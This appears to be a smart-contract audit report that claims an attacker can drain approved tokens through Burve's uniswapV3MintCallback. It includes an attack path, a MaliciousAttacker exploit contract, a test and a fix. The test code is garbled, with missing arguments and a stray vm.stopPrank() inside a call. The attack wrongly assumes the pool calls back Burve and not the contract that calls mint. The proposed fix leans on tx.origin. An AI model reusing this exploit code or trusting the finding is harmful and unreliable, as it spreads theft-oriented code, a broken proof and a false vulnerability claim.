# Attacker will steal approved tokens from users by exploiting uniswapV3MintCallback

### Summary

**The blind trust of the `source` address in `uniswapV3MintCallback` will cause a complete loss of approved tokens for users as an attacker will manipulate Uniswap V3 pool callbacks to drain tokens from any address that has approved the contract.**

### Root Cause

In [`Burve.sol:828`](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/single/Burve.sol#L828) the contract blindly trusts the address decoded from `data` parameter without validating that it's the transaction initiator or explicitly authorized for this operation. While the function verifies the caller is the Uniswap pool with 
```solidity
if (msg.sender != address(pool)) { revert UniswapV3MintCallbackSenderNotPool(msg.sender); }
```
 it doesn't verify the authenticity of the `source` address that will be charged for the tokens.

### Internal Pre-conditions

A user needs to approve tokens to the Burve contract (common for users intending to interact with the Uniswap V3 pool through Burve)

### External Pre-conditions

A legitimate Uniswap V3 pool must exist and be referenced by the Burve contract (already configured)

### Attack Path

1. **Attacker identifies a victim who has approved tokens to the Burve contract**
2. **Attacker deploys a malicious contract (`MaliciousAttacker`) that stores the victim's address and the pool address**
3. **Attacker calls the malicious contract's `attack` function with appropriate tickLower, tickUpper, and amount parameters**
4. **The malicious contract calls the Uniswap V3 pool's `mint()` function with:**
           - The malicious contract as the recipient (address(this))
           - The position boundaries (tickLower, tickUpper)
           - The liquidity amount
           - The victim's address encoded in the `data` parameter: `abi.encode(victim)`
5. **The Uniswap pool calls back to Burve's `uniswapV3MintCallback` function with:**
           - The required token amounts (amount0Owed, amount1Owed)
           - The data containing the victim's address
6. **Burve verifies the caller is the pool (passes), then:**
           - Decodes the victim's address from the data
           - Transfers tokens from the victim to the pool without further validation
7. **The Uniswap position is successfully minted, owned by the attacker's contract**
8. **Attacker withdraws the stolen tokens by calling the malicious contract's `withdrawStolenTokens` function**

### Impact

**Users suffer a complete loss of any tokens they have approved to the Burve contract, up to their approved amount. The attacker gains these tokens in the form of a Uniswap V3 position that they control and can withdraw at any time.**

This impact is severe because:
1. It affects any user who has approved tokens to the contract, even if they haven't actively used the contract yet
2. The loss can equal the user's full approved amount 
3. The attack can be executed automatically via MEV bots monitoring the mempool for approval transactions
4. The attack leaves no protection options for users once they've approved tokens
5. Stolen funds can be immediately withdrawn by the attacker

### PoC

```solidity
contract MaliciousAttacker {
    // The victim whose funds will be stolen
    address public victim;
    IUniswapV3Pool public pool;

    constructor(address _victim, address _pool) {
        victim = _victim;
        pool = IUniswapV3Pool(_pool);
    }

    // Function to execute the attack
    function attack(
        int24 tickLower,
        int24 tickUpper,
        uint128 amount
    ) external returns (uint128) {
        // Call the pool's mint function with our address as recipient
        // The data parameter encodes the victim's address
        pool.mint(
            address(this), // Position will be owned by this contract
            tickLower,
            tickUpper,
            amount,
            abi.encode(victim) // Critical part - victim's address as source
        );

        // Return the liquidity amount for later withdrawal
        return amount;
    }

    // Function to withdraw the stolen tokens
    function withdrawStolenTokens(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) external returns (uint256 amount0, uint256 amount1) {
        // Burn the position liquidity
        pool.burn(tickLower, tickUpper, liquidity);

        // Collect all tokens
        (amount0, amount1) = pool.collect(
            address(this),
            tickLower,
            tickUpper,
            type(uint128).max,
            type(uint128).max
        );

        // Transfer tokens to the caller
        if (amount0 > 0) {
            IERC20(pool.token0()).transfer(msg.sender, amount0);
        }
        if (amount1 > 0) {
            IERC20(pool.token1()).transfer(msg.sender, amount1);
        }
    }
}

Add this test in Burve.t.sol in BurveTest contract
```solidity
    /// @notice Test to demonstrate the vulnerability in uniswapV3MintCallback
    /// An attacker can drain tokens from any user who has approved tokens to the Burve contract
    function test_UniswapV3MintCallback_Exploit() public forkOnly {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        // Get current tick for position boundaries
        (, int24 currentTick, , , , , ) = pool.slot0();
        int24 tickSpacing = pool.tickSpacing();
        int24 tickLower = currentTick - (tickSpacing * 10);
        int24 tickUpper = currentTick + (tickSpacing * 10);

        // Amount of tokens needed for the position
        uint128 liquidityAmount = 100000; // A reasonable liquidity amount
        (uint256 amount0Needed, uint256 amount1Needed) = getAmountsForLiquidity(
            liquidityAmount,
            tickLower,

            true
        );

        vm.stopPrank();

        // Deploy the malicious contract
        MaliciousAttacker maliciousContract = new MaliciousAttacker(
            victim,
            address(pool)
        );

        // Execute attack
        vm.startPrank(attacker);
        uint128 providedLiquidity = maliciousContract.attack(

        vm.stopPrank();

        );

        // NOW DEMONSTRATE THE ATTACKER WITHDRAWING THE STOLEN TOKENS
        // Record token balances before withdrawal
        uint256 attackerToken0Before = token0.balanceOf(attacker);
        uint256 attackerToken1Before = token1.balanceOf(attacker);

        // Attacker withdraws tokens from the position
        vm.startPrank(attacker);
        maliciousContract.withdrawStolenTokens(

        );
    }
```

### Mitigation

The vulnerability can be fixed by modifying the `uniswapV3MintCallback` function to validate the source address:

```solidity
        function uniswapV3MintCallback(
            uint256 amount0Owed,
            uint256 amount1Owed,
            bytes calldata data
        ) external {
            if (msg.sender != address(pool)) {
                revert UniswapV3MintCallbackSenderNotPool(msg.sender);
            }

            address source = abi.decode(data, (address));
            
            // Add validation that source is the transaction initiator or explicitly authorized
            if (source != tx.origin && source != msg.sender) {
                revert UnauthorizedSource(source);
            }

            TransferHelper.safeTransferFrom(
                address(token0),
                source,
                address(pool),
                amount0Owed
            );
            TransferHelper.safeTransferFrom(
                address(token1),
                source,
                address(pool),
                amount1Owed
            );
        }
```

Alternatively, implement a more robust authorization mechanism that tracks which addresses are allowed to be used as sources in callbacks, requiring explicit registration or authorization before tokens can be transferred on their behalf.
